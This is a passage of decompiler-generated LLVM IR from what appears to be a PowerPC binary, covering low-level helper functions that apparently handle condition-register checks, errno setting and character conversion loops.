  br label %dec_label_pc_10010298

dec_label_pc_10010298:                            ; preds = %dec_label_pc_10010240.thread, %dec_label_pc_10010268
  %v0_10010298 = load i32, i32* @r30, align 4
  %v1_10010298 = inttoptr i32 %v0_10010298 to i32*
  %v2_10010298 = load i32, i32* %v1_10010298, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10010298, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -18196) to i32*), align 4
  %v0_100102c4 = load i32, i32* @r27, align 4
  store i32 %v0_100102c4, i32* @global_var_1002b94c.786, align 4
  br i1 false, label %dec_label_pc_100102cc, label %dec_label_pc_10010344

dec_label_pc_100102cc:                            ; preds = %dec_label_pc_10010298, %dec_label_pc_100102cc
  br i1 undef, label %dec_label_pc_100102cc, label %dec_label_pc_10010344

dec_label_pc_10010344:                            ; preds = %dec_label_pc_100102cc, %dec_label_pc_10010298
  %v0_100102f0 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_100102f0)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10010354 = call i32 @function_1000c85c()
  %v2_1001035c = inttoptr i32 %v0_10010354 to i32*
  store i32 0, i32* %v2_1001035c, align 4
  %v0_10010370 = call i32 @function_1001063c()
  %v2_10010378 = inttoptr i32 %v0_10010370 to i32*
  store i32 0, i32* %v2_10010378, align 4
  %v0_10010388 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10010388)
  %v0_10010394 = call i32 @function_1000fc20()
  ret i32 %v0_10010394

; uselistorder directives
  uselistorder i32 %v2_100101dc, { 1, 0 }
  uselistorder i32 %v1_100101d8, { 2, 1, 0 }
  uselistorder i32 %v1_100101a4, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10010184, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @function_1000fc20, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 (i32, i32)* @function_1001004c, { 2, 1, 0 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100102cc, { 1, 0 }
  uselistorder label %dec_label_pc_10010298, { 1, 0 }
  uselistorder label %dec_label_pc_10010204, { 1, 0 }
  uselistorder label %dec_label_pc_100101d8, { 1, 0 }
  uselistorder label %dec_label_pc_100101b8, { 1, 0 }
  uselistorder label %dec_label_pc_10010184, { 1, 0 }
}

define i32 @function_10010398() local_unnamed_addr {
dec_label_pc_10010398:
  %v0_100103a4 = load i32, i32* @r3, align 4
  store i32 %v0_100103a4, i32* @r29, align 4
  %v0_100103ac = call i32 @function_1000c85c()
  %v0_100103b0 = load i32, i32* @r29, align 4
  %v2_100103b0 = inttoptr i32 %v0_100103ac to i32*
  store i32 %v0_100103b0, i32* %v2_100103b0, align 4
  ret i32 -1
}

define i32 @function_100103cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100103cc:
  %r31.global-to-local = alloca i32, align 4
  %v0_100103e4 = call i32 @__asm_mfcr()
  %v1_100103e8 = and i32 %v0_100103e4, 268435456
  %v3_100103e8 = icmp eq i32 %v1_100103e8, 0
  store i32 %v0_100103e4, i32* %r31.global-to-local, align 4
  br i1 %v3_100103e8, label %dec_label_pc_10010400, label %dec_label_pc_100103f4

dec_label_pc_100103f4:                            ; preds = %dec_label_pc_100103cc
  %v0_100103f4 = call i32 @function_1000c85c()
  %v0_100103f8 = load i32, i32* %r31.global-to-local, align 4
  %v2_100103f8 = inttoptr i32 %v0_100103f4 to i32*
  store i32 %v0_100103f8, i32* %v2_100103f8, align 4
  br label %dec_label_pc_10010400

dec_label_pc_10010400:                            ; preds = %dec_label_pc_100103cc, %dec_label_pc_100103f4
  %v0_10010410 = phi i32 [ %v0_100103e4, %dec_label_pc_100103cc ], [ -1, %dec_label_pc_100103f4 ]
  ret i32 %v0_10010410

; uselistorder directives
  uselistorder label %dec_label_pc_10010400, { 1, 0 }
}

define i32 @function_10010414(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10010414:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001042c = call i32 @__asm_mfcr()
  %v1_10010430 = and i32 %v0_1001042c, 268435456
  %v3_10010430 = icmp eq i32 %v1_10010430, 0
  store i32 %v0_1001042c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010430, label %dec_label_pc_10010448, label %dec_label_pc_1001043c

dec_label_pc_1001043c:                            ; preds = %dec_label_pc_10010414
  %v0_1001043c = call i32 @function_1000c85c()
  %v0_10010440 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010440 = inttoptr i32 %v0_1001043c to i32*
  store i32 %v0_10010440, i32* %v2_10010440, align 4
  br label %dec_label_pc_10010448

dec_label_pc_10010448:                            ; preds = %dec_label_pc_10010414, %dec_label_pc_1001043c
  %v0_10010458 = phi i32 [ %v0_1001042c, %dec_label_pc_10010414 ], [ -1, %dec_label_pc_1001043c ]
  ret i32 %v0_10010458

; uselistorder directives
  uselistorder label %dec_label_pc_10010448, { 1, 0 }
}

define i32 @function_1001045c() local_unnamed_addr {
dec_label_pc_1001045c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010474 = call i32 @__asm_mfcr()
  %v1_10010478 = and i32 %v0_10010474, 268435456
  %v3_10010478 = icmp eq i32 %v1_10010478, 0
  store i32 %v0_10010474, i32* %r31.global-to-local, align 4
  br i1 %v3_10010478, label %dec_label_pc_10010490, label %dec_label_pc_10010484

dec_label_pc_10010484:                            ; preds = %dec_label_pc_1001045c
  %v0_10010484 = call i32 @function_1000c85c()
  %v0_10010488 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010488 = inttoptr i32 %v0_10010484 to i32*
  store i32 %v0_10010488, i32* %v2_10010488, align 4
  br label %dec_label_pc_10010490

dec_label_pc_10010490:                            ; preds = %dec_label_pc_1001045c, %dec_label_pc_10010484
  %v0_100104a0 = phi i32 [ %v0_10010474, %dec_label_pc_1001045c ], [ -1, %dec_label_pc_10010484 ]
  ret i32 %v0_100104a0

; uselistorder directives
  uselistorder label %dec_label_pc_10010490, { 1, 0 }
}

define i32 @function_100104a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100104a4:
  %r31.global-to-local = alloca i32, align 4
  %v0_100104bc = call i32 @__asm_mfcr()
  %v1_100104c0 = and i32 %v0_100104bc, 268435456
  %v3_100104c0 = icmp eq i32 %v1_100104c0, 0
  store i32 %v0_100104bc, i32* %r31.global-to-local, align 4
  br i1 %v3_100104c0, label %dec_label_pc_100104d8, label %dec_label_pc_100104cc

dec_label_pc_100104cc:                            ; preds = %dec_label_pc_100104a4
  %v0_100104cc = call i32 @function_1000c85c()
  %v0_100104d0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100104d0 = inttoptr i32 %v0_100104cc to i32*
  store i32 %v0_100104d0, i32* %v2_100104d0, align 4
  br label %dec_label_pc_100104d8

dec_label_pc_100104d8:                            ; preds = %dec_label_pc_100104a4, %dec_label_pc_100104cc
  %v0_100104e8 = phi i32 [ %v0_100104bc, %dec_label_pc_100104a4 ], [ -1, %dec_label_pc_100104cc ]
  ret i32 %v0_100104e8

; uselistorder directives
  uselistorder label %dec_label_pc_100104d8, { 1, 0 }
}

define i32 @function_100104ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_100104ec:
  %r31.global-to-local = alloca i32, align 4
  %v0_10010504 = call i32 @__asm_mfcr()
  %v1_10010508 = and i32 %v0_10010504, 268435456
  %v3_10010508 = icmp eq i32 %v1_10010508, 0
  store i32 %v0_10010504, i32* %r31.global-to-local, align 4
  br i1 %v3_10010508, label %dec_label_pc_10010520, label %dec_label_pc_10010514

dec_label_pc_10010514:                            ; preds = %dec_label_pc_100104ec
  %v0_10010514 = call i32 @function_1000c85c()
  %v0_10010518 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010518 = inttoptr i32 %v0_10010514 to i32*
  store i32 %v0_10010518, i32* %v2_10010518, align 4
  br label %dec_label_pc_10010520

dec_label_pc_10010520:                            ; preds = %dec_label_pc_100104ec, %dec_label_pc_10010514
  %v0_10010530 = phi i32 [ %v0_10010504, %dec_label_pc_100104ec ], [ -1, %dec_label_pc_10010514 ]
  ret i32 %v0_10010530

; uselistorder directives
  uselistorder label %dec_label_pc_10010520, { 1, 0 }
}

define i32 @function_10010534(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10010534:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001054c = call i32 @__asm_mfcr()
  %v1_10010550 = and i32 %v0_1001054c, 268435456
  %v3_10010550 = icmp eq i32 %v1_10010550, 0
  store i32 %v0_1001054c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010550, label %dec_label_pc_10010568, label %dec_label_pc_1001055c

dec_label_pc_1001055c:                            ; preds = %dec_label_pc_10010534
  %v0_1001055c = call i32 @function_1000c85c()
  %v0_10010560 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010560 = inttoptr i32 %v0_1001055c to i32*
  store i32 %v0_10010560, i32* %v2_10010560, align 4
  br label %dec_label_pc_10010568

dec_label_pc_10010568:                            ; preds = %dec_label_pc_10010534, %dec_label_pc_1001055c
  %v0_10010578 = phi i32 [ %v0_1001054c, %dec_label_pc_10010534 ], [ -1, %dec_label_pc_1001055c ]
  ret i32 %v0_10010578

; uselistorder directives
  uselistorder label %dec_label_pc_10010568, { 1, 0 }
}

define i32 @function_1001057c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001057c:
  store i32 %arg1, i32* @r30, align 4
  %v3_10010598 = load i32, i32* @global_var_1002b978.793, align 4
  %v3_1001059c = icmp eq i32 %v3_10010598, 0
  br i1 %v3_1001059c, label %dec_label_pc_100105a4, label %dec_label_pc_100105b0

dec_label_pc_100105a4:                            ; preds = %dec_label_pc_1001057c
  store i32 268502440, i32* @lr, align 4
  %v1_100105a4 = call i32 @function_100124d8(i32 0)
  %v1_100105a8 = icmp slt i32 %v1_100105a4, 0
  br i1 %v1_100105a8, label %dec_label_pc_100105d8, label %dec_label_pc_100105a4.dec_label_pc_100105b0_crit_edge

dec_label_pc_100105a4.dec_label_pc_100105b0_crit_edge: ; preds = %dec_label_pc_100105a4
  %v0_100105b0.pre = load i32, i32* @r30, align 4
  %v3_100105b4.pre = load i32, i32* @global_var_1002b978.793, align 4
  br label %dec_label_pc_100105b0

dec_label_pc_100105b0:                            ; preds = %dec_label_pc_100105a4.dec_label_pc_100105b0_crit_edge, %dec_label_pc_1001057c
  %v3_100105b4 = phi i32 [ %v3_100105b4.pre, %dec_label_pc_100105a4.dec_label_pc_100105b0_crit_edge ], [ %v3_10010598, %dec_label_pc_1001057c ]
  %v1_100105c8 = phi i32 [ %v0_100105b0.pre, %dec_label_pc_100105a4.dec_label_pc_100105b0_crit_edge ], [ %arg1, %dec_label_pc_1001057c ]
  %v3_100105b0 = icmp eq i32 %v1_100105c8, 0
  store i32 %v3_100105b4, i32* @r31, align 4
  br i1 %v3_100105b0, label %dec_label_pc_100105dc, label %dec_label_pc_100105c4

dec_label_pc_100105c4:                            ; preds = %dec_label_pc_100105b0
  %v2_100105c8 = add i32 %v1_100105c8, %v3_100105b4
  store i32 268502480, i32* @lr, align 4
  %v1_100105cc = call i32 @function_100124d8(i32 %v2_100105c8)
  %tmp6 = icmp sgt i32 %v1_100105cc, -1
  br i1 %tmp6, label %dec_label_pc_100105c4.dec_label_pc_100105dc_crit_edge, label %dec_label_pc_100105d8

dec_label_pc_100105c4.dec_label_pc_100105dc_crit_edge: ; preds = %dec_label_pc_100105c4
  %v0_100105e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100105dc

dec_label_pc_100105d8:                            ; preds = %dec_label_pc_100105c4, %dec_label_pc_100105a4
  store i32 -1, i32* @r31, align 4
  br label %dec_label_pc_100105dc

dec_label_pc_100105dc:                            ; preds = %dec_label_pc_100105c4.dec_label_pc_100105dc_crit_edge, %dec_label_pc_100105b0, %dec_label_pc_100105d8
  %v0_100105e0 = phi i32 [ %v0_100105e0.pre, %dec_label_pc_100105c4.dec_label_pc_100105dc_crit_edge ], [ %v3_100105b4, %dec_label_pc_100105b0 ], [ -1, %dec_label_pc_100105d8 ]
  ret i32 %v0_100105e0

; uselistorder directives
  uselistorder i32 %v3_100105b4, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_100124d8, { 1, 0 }
  uselistorder label %dec_label_pc_100105dc, { 2, 0, 1 }
}

define i32 @function_100105f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100105f4:
  %r31.global-to-local = alloca i32, align 4
  %v0_1001060c = call i32 @__asm_mfcr()
  %v1_10010610 = and i32 %v0_1001060c, 268435456
  %v3_10010610 = icmp eq i32 %v1_10010610, 0
  store i32 %v0_1001060c, i32* %r31.global-to-local, align 4
  br i1 %v3_10010610, label %dec_label_pc_10010628, label %dec_label_pc_1001061c

dec_label_pc_1001061c:                            ; preds = %dec_label_pc_100105f4
  %v0_1001061c = call i32 @function_1000c85c()
  %v0_10010620 = load i32, i32* %r31.global-to-local, align 4
  %v2_10010620 = inttoptr i32 %v0_1001061c to i32*
  store i32 %v0_10010620, i32* %v2_10010620, align 4
  br label %dec_label_pc_10010628

dec_label_pc_10010628:                            ; preds = %dec_label_pc_100105f4, %dec_label_pc_1001061c
  %v0_10010638 = phi i32 [ %v0_1001060c, %dec_label_pc_100105f4 ], [ -1, %dec_label_pc_1001061c ]
  ret i32 %v0_10010638

; uselistorder directives
  uselistorder label %dec_label_pc_10010628, { 1, 0 }
}

define i32 @function_1001063c() local_unnamed_addr {
dec_label_pc_1001063c:
  ret i32 ptrtoint (i32* @global_var_1002b95c.794 to i32)
}

define i32 @function_10010648(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10010648:
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10010650 = icmp eq i32 %arg1, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 16, i32* @r6, align 4
  %v2_10010664 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10010664, i32* @r4, align 4
  store i32 1, i32* @r5, align 4
  br i1 %v3_10010650, label %dec_label_pc_10010670, label %dec_label_pc_10010678

dec_label_pc_10010670:                            ; preds = %dec_label_pc_10010648
  %v2_10010670 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_10010670, i32* @r3, align 4
  br label %dec_label_pc_10010678

dec_label_pc_10010678:                            ; preds = %dec_label_pc_10010648, %dec_label_pc_10010670
  %v0_1001067c = phi i32 [ %arg2, %dec_label_pc_10010648 ], [ 0, %dec_label_pc_10010670 ]
  %v2_10010678 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v0_1001067c, i32* %stack_var_-40, align 4
  store i32 %v2_10010678, i32* %stack_var_-36, align 4
  store i32 268502664, i32* @lr, align 4
  %v0_10010684 = call i32 @function_100106b4()
  %v3_10010688 = icmp eq i32 %v0_10010684, 0
  br i1 %v3_10010688, label %dec_label_pc_10010690, label %dec_label_pc_10010694

dec_label_pc_10010690:                            ; preds = %dec_label_pc_10010678
  br label %dec_label_pc_10010694

dec_label_pc_10010694:                            ; preds = %dec_label_pc_10010678, %dec_label_pc_10010690
  %v0_100106a0 = phi i32 [ %v0_10010684, %dec_label_pc_10010678 ], [ 1, %dec_label_pc_10010690 ]
  ret i32 %v0_100106a0

; uselistorder directives
  uselistorder label %dec_label_pc_10010694, { 1, 0 }
  uselistorder label %dec_label_pc_10010678, { 1, 0 }
}

define i32 @function_100106a4() local_unnamed_addr {
dec_label_pc_100106a4:
  %v0_100106a4 = load i32, i32* @r6, align 4
  store i32 %v0_100106a4, i32* @r7, align 4
  %v0_100106a8 = load i32, i32* @r5, align 4
  store i32 %v0_100106a8, i32* @r6, align 4
  store i32 -1, i32* @r5, align 4
  %v0_100106b0 = call i32 @function_100106b4()
  ret i32 %v0_100106b0

; uselistorder directives
  uselistorder i32 ()* @function_100106b4, { 1, 0 }
}

define i32 @function_100106b4() local_unnamed_addr {
dec_label_pc_100106b4:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100106b8 = load i32, i32* @lr, align 4
  store i32 %v0_100106b8, i32* %r0.global-to-local, align 4
  %v0_100106bc = load i32, i32* @r3, align 4
  %v3_100106bc = icmp eq i32 %v0_100106bc, 0
  br i1 %v3_100106bc, label %dec_label_pc_100106e0, label %dec_label_pc_100106c8

dec_label_pc_100106c8:                            ; preds = %dec_label_pc_100106b4
  %v1_100106c8 = load i32, i32* @r4, align 4
  %v4_100106c8 = icmp eq i32 %v0_100106bc, %v1_100106c8
  store i32 1, i32* %r10.global-to-local, align 4
  br i1 %v4_100106c8, label %dec_label_pc_100106d4, label %dec_label_pc_1001070c

dec_label_pc_100106d4:                            ; preds = %dec_label_pc_100106c8
  %v2_100106d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100106d8, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001070c

dec_label_pc_100106e0:                            ; preds = %dec_label_pc_100106b4
  %v2_100106d811 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100106d811, i32* @r3, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_1001070c

dec_label_pc_100106ec:                            ; preds = %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge, %dec_label_pc_1001072c.preheader
  %v0_100106ec = call i32 @function_1000c85c()
  store i32 84, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  %v2_100106f8 = inttoptr i32 %v0_100106ec to i32*
  store i32 84, i32* %v2_100106f8, align 4
  %v0_10010770.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001076c

dec_label_pc_10010700:                            ; preds = %dec_label_pc_1001073c
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1001075c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10010758

dec_label_pc_1001070c:                            ; preds = %dec_label_pc_100106d4, %dec_label_pc_100106c8, %dec_label_pc_100106e0
  %v2_1001073c7 = phi i32 [ %v2_100106d8, %dec_label_pc_100106d4 ], [ %v0_100106bc, %dec_label_pc_100106c8 ], [ %v2_100106d811, %dec_label_pc_100106e0 ]
  %v0_1001070c = load i32, i32* @r5, align 4
  %v1_1001070c = load i32, i32* @r6, align 4
  %v3_1001070c = icmp ugt i32 %v0_1001070c, %v1_1001070c
  br i1 %v3_1001070c, label %dec_label_pc_10010714, label %dec_label_pc_10010718

dec_label_pc_10010714:                            ; preds = %dec_label_pc_1001070c
  store i32 %v1_1001070c, i32* @r5, align 4
  br label %dec_label_pc_10010718

dec_label_pc_10010718:                            ; preds = %dec_label_pc_1001070c, %dec_label_pc_10010714
  %v0_10010724 = phi i32 [ %v0_1001070c, %dec_label_pc_1001070c ], [ %v1_1001070c, %dec_label_pc_10010714 ]
  %v1_10010718 = add i32 %v0_10010724, 1
  store i32 %v1_10010718, i32* %r0.global-to-local, align 4
  %v0_1001071c = load i32, i32* @r4, align 4
  %v1_1001071c = inttoptr i32 %v0_1001071c to i32*
  %v2_1001071c = load i32, i32* %v1_1001071c, align 4
  store i32 %v2_1001071c, i32* %r11.global-to-local, align 4
  store i32 %v0_10010724, i32* %r9.global-to-local, align 4
  store i32 %v0_10010724, i32* %ctr.global-to-local, align 4
  %v2_100107543 = icmp eq i32 %v0_10010724, 0
  br i1 %v2_100107543, label %dec_label_pc_10010758, label %dec_label_pc_1001072c.preheader

dec_label_pc_1001072c.preheader:                  ; preds = %dec_label_pc_10010718
  %v1_1001072c16 = inttoptr i32 %v2_1001071c to i32*
  %v2_1001072c17 = load i32, i32* %v1_1001072c16, align 4
  store i32 %v2_1001072c17, i32* %r0.global-to-local, align 4
  %v1_1001073018 = add i32 %v2_1001071c, 4
  store i32 %v1_1001073018, i32* %r11.global-to-local, align 4
  %v2_1001073420 = icmp ugt i32 %v2_1001072c17, 127
  br i1 %v2_1001073420, label %dec_label_pc_100106ec, label %dec_label_pc_1001073c.lr.ph

dec_label_pc_1001073c.lr.ph:                      ; preds = %dec_label_pc_1001072c.preheader
  %extract.t = trunc i32 %v2_1001072c17 to i8
  br label %dec_label_pc_1001073c

dec_label_pc_1001073c:                            ; preds = %dec_label_pc_1001073c.lr.ph, %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge
  %v2_1001072c23.off0 = phi i8 [ %extract.t, %dec_label_pc_1001073c.lr.ph ], [ %extract.t24, %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge ]
  %v2_1001073c22 = phi i32 [ %v2_1001073c7, %dec_label_pc_1001073c.lr.ph ], [ %v2_1001074c, %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge ]
  %v3_1001073c = inttoptr i32 %v2_1001073c22 to i8*
  store i8 %v2_1001072c23.off0, i8* %v3_1001073c, align 1
  %v0_10010740 = load i32, i32* %r0.global-to-local, align 4
  %v1_10010740 = urem i32 %v0_10010740, 256
  store i32 %v1_10010740, i32* %r0.global-to-local, align 4
  %v3_10010744 = icmp eq i32 %v1_10010740, 0
  br i1 %v3_10010744, label %dec_label_pc_10010700, label %dec_label_pc_1001074c

dec_label_pc_1001074c:                            ; preds = %dec_label_pc_1001073c
  %v0_1001074c = load i32, i32* @r3, align 4
  %v1_1001074c = load i32, i32* %r10.global-to-local, align 4
  %v2_1001074c = add i32 %v1_1001074c, %v0_1001074c
  store i32 %v2_1001074c, i32* @r3, align 4
  %v0_10010750 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010750 = add i32 %v0_10010750, -1
  store i32 %v1_10010750, i32* %r9.global-to-local, align 4
  %v0_10010754 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10010754 = add i32 %v0_10010754, -1
  store i32 %v1_10010754, i32* %ctr.global-to-local, align 4
  %v2_10010754 = icmp eq i32 %v1_10010754, 0
  br i1 %v2_10010754, label %dec_label_pc_10010758, label %dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge

dec_label_pc_1001074c.dec_label_pc_1001072c_crit_edge: ; preds = %dec_label_pc_1001074c
  %v0_1001072c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1001072c = inttoptr i32 %v0_1001072c.pre to i32*
  %v2_1001072c = load i32, i32* %v1_1001072c, align 4
  store i32 %v2_1001072c, i32* %r0.global-to-local, align 4
  %v1_10010730 = add i32 %v0_1001072c.pre, 4
  store i32 %v1_10010730, i32* %r11.global-to-local, align 4
  %v2_10010734 = icmp ugt i32 %v2_1001072c, 127
  %extract.t24 = trunc i32 %v2_1001072c to i8
  br i1 %v2_10010734, label %dec_label_pc_100106ec, label %dec_label_pc_1001073c

dec_label_pc_10010758:                            ; preds = %dec_label_pc_1001074c, %dec_label_pc_10010718, %dec_label_pc_10010700
  %v0_1001075c = phi i32 [ %v0_1001075c.pre, %dec_label_pc_10010700 ], [ %v2_1001073c7, %dec_label_pc_10010718 ], [ %v2_1001074c, %dec_label_pc_1001074c ]
  %v2_10010758 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10010758, i32* %r0.global-to-local, align 4
  %v4_1001075c = icmp eq i32 %v0_1001075c, %v2_10010758
  br i1 %v4_1001075c, label %dec_label_pc_10010768, label %dec_label_pc_10010764

dec_label_pc_10010764:                            ; preds = %dec_label_pc_10010758
  %v0_10010764 = load i32, i32* %r11.global-to-local, align 4
  %v1_10010764 = load i32, i32* @r4, align 4
  %v2_10010764 = inttoptr i32 %v1_10010764 to i32*
  store i32 %v0_10010764, i32* %v2_10010764, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010768:                            ; preds = %dec_label_pc_10010758, %dec_label_pc_10010764
  %v0_10010768 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010768 = load i32, i32* @r5, align 4
  %v2_10010768 = sub i32 %v1_10010768, %v0_10010768
  store i32 %v2_10010768, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1001076c

dec_label_pc_1001076c:                            ; preds = %dec_label_pc_100106ec, %dec_label_pc_10010768
  %v0_10010770 = phi i32 [ %v0_10010770.pre, %dec_label_pc_100106ec ], [ %v2_10010768, %dec_label_pc_10010768 ]
  store i32 %v0_100106b8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10010770

; uselistorder directives
  uselistorder i32 %v1_10010754, { 1, 0 }
  uselistorder i32 %v2_1001074c, { 0, 2, 1 }
  uselistorder i32 %v1_10010740, { 1, 0 }
  uselistorder i32 %v0_10010724, { 2, 3, 0, 1 }
  uselistorder i32 %v2_1001073c7, { 1, 0 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 2, 0, 5, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 6, 3, 5, 0, 7, 4, 8 }
  uselistorder i32 84, { 4, 6, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_1001076c, { 1, 0 }
  uselistorder label %dec_label_pc_10010768, { 1, 0 }
  uselistorder label %dec_label_pc_1001073c, { 1, 0 }
  uselistorder label %dec_label_pc_10010718, { 1, 0 }
  uselistorder label %dec_label_pc_1001070c, { 2, 0, 1 }
}

define i32 @function_10010780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10010780:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_1001078c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1001078c, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_100107e4 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_100107e4, i32* %stack_var_-96, align 4
  store i32 268503024, i32* @lr, align 4
  %v0_100107ec = call i32 @function_100113c0()
  ret i32 %v0_100107ec
}

define i32 @function_10010800(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10010800:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_10010804 = load i32, i32* @lr, align 4
  store i32 %v0_10010804, i32* %r0.global-to-local, align 4
  %v0_10010810 = load i32, i32* @r5, align 4
  store i32 %v0_10010810, i32* @r28, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_10010810, i32* @r31, align 4
  %v3_100108203 = icmp eq i32 %v0_10010810, 0
  br i1 %v3_100108203, label %dec_label_pc_100108c8, label %dec_label_pc_1001082c

dec_label_pc_1001082c:                            ; preds = %dec_label_pc_10010800, %dec_label_pc_10010850
  %v0_10010840 = phi i32 [ %v2_10010850, %dec_label_pc_10010850 ], [ %arg2, %dec_label_pc_10010800 ]
  %v0_1001082c = phi i32 [ %v2_10010854, %dec_label_pc_10010850 ], [ %v0_10010810, %dec_label_pc_10010800 ]
  %v1_10010830.in = phi i32 [ %v2_10010854, %dec_label_pc_10010850 ], [ %v0_10010810, %dec_label_pc_10010800 ]
  %v1_10010830 = icmp sgt i32 %v1_10010830.in, 0
  store i32 %v0_1001082c, i32* @r27, align 4
  br i1 %v1_10010830, label %dec_label_pc_1001083c, label %dec_label_pc_10010834

dec_label_pc_10010834:                            ; preds = %dec_label_pc_1001082c
  br label %dec_label_pc_1001083c

dec_label_pc_1001083c:                            ; preds = %dec_label_pc_1001082c, %dec_label_pc_10010834
  %v0_1001083c = load i32, i32* @r30, align 4
  %v1_1001083c = add i32 %v0_1001083c, 4
  %v2_1001083c = inttoptr i32 %v1_1001083c to i32*
  %v3_1001083c = load i32, i32* %v2_1001083c, align 4
  store i32 268503112, i32* @lr, align 4
  %v3_10010844 = call i32 @function_1000c7dc(i32 %v3_1001083c, i32 %v0_10010840)
  %v1_10010848 = icmp slt i32 %v3_10010844, 0
  br i1 %v1_10010848, label %dec_label_pc_1001085c, label %dec_label_pc_10010850

dec_label_pc_10010850:                            ; preds = %dec_label_pc_1001083c
  %v0_10010850 = load i32, i32* @r29, align 4
  %v2_10010850 = add i32 %v0_10010850, %v3_10010844
  store i32 %v2_10010850, i32* @r29, align 4
  %v1_10010854 = load i32, i32* @r31, align 4
  %v2_10010854 = sub i32 %v1_10010854, %v3_10010844
  store i32 %v2_10010854, i32* @r31, align 4
  %v3_10010820 = icmp eq i32 %v2_10010854, 0
  br i1 %v3_10010820, label %dec_label_pc_10010820.dec_label_pc_100108c8.loopexit_crit_edge, label %dec_label_pc_1001082c

dec_label_pc_1001085c:                            ; preds = %dec_label_pc_1001083c
  %v0_1001085c = load i32, i32* @r30, align 4
  %v1_1001085c = add i32 %v0_1001085c, 8
  %v2_1001085c = inttoptr i32 %v1_1001085c to i32*
  %v3_1001085c = load i32, i32* %v2_1001085c, align 4
  store i32 %v3_1001085c, i32* %r11.global-to-local, align 4
  %v1_10010860 = add i32 %v0_1001085c, 12
  %v2_10010860 = inttoptr i32 %v1_10010860 to i32*
  %v3_10010860 = load i32, i32* %v2_10010860, align 4
